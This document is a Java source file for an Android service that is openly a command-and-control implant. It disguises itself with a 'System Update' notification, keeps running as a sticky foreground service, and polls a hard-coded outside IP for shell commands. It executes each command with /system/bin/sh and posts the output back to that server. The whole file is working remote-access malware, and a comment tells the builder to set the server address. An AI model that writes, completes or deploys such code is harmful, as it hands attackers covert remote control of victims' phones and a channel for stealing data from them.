package com.androdls;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public class Agent extends Service {

    // C2 endpoint — update C2_IP before building
    private static final String C2_IP = "100.68.158.25";
    private static final int C2_PORT = 8080;
    private static final String C2_BASE = "http://" + C2_IP + ":" + C2_PORT;
    private static final long HEARTBEAT_MS = 60000;
    private static final String UA = "Mozilla/5.0 (Linux; Android)";

    private volatile boolean running = true;
    private final Handler h = new Handler(Looper.getMainLooper());

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.app.NotificationChannel ch = new android.app.NotificationChannel(
                "dls", "System Update", android.app.NotificationManager.IMPORTANCE_LOW);
            ((android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        startForeground(1, new android.app.Notification.Builder(this, "dls")
                .setContentTitle("System Update")
                .setContentText("Updating...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build());
        new Thread(this::loop).start();
        return START_STICKY;
    }

    private void loop() {
        while (running) {
            try {
                String cmd = fetchCmd();
                if (cmd != null && !cmd.isEmpty() && !cmd.equals("NONE")) {
                    String out = exec(cmd);
                    postResult(out);
                }
            } catch (Exception ignored) {}
            try { Thread.sleep(HEARTBEAT_MS); } catch (InterruptedException e) { break; }
        }
    }

    private String fetchCmd() throws Exception {
        URL u = new URL(C2_BASE + "/cmd");
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("GET");
        c.setRequestProperty("User-Agent", UA);
        c.setConnectTimeout(10000);
        c.setReadTimeout(10000);
        BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        String l;
        while ((l = r.readLine()) != null) sb.append(l).append("\n");
        c.disconnect();
        return sb.toString().trim();
    }

    private String exec(String cmd) {
        try {
            Process p = new ProcessBuilder("/system/bin/sh", "-c", cmd).redirectErrorStream(true).start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = r.readLine()) != null) sb.append(l).append("\n");
            p.waitFor();
            return sb.toString();
        } catch (Exception e) { return "ERR:" + e.getMessage(); }
    }

    private void postResult(String out) throws Exception {
        URL u = new URL(C2_BASE + "/result");
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("User-Agent", UA);
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        OutputStream os = c.getOutputStream();
        os.write(("out=" + out.replace("\n", "%0A")).getBytes(StandardCharsets.UTF_8));
        os.flush(); os.close();
        c.getResponseCode();
        c.disconnect();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
    @Override
    public void onDestroy() { running = false; super.onDestroy(); }
}
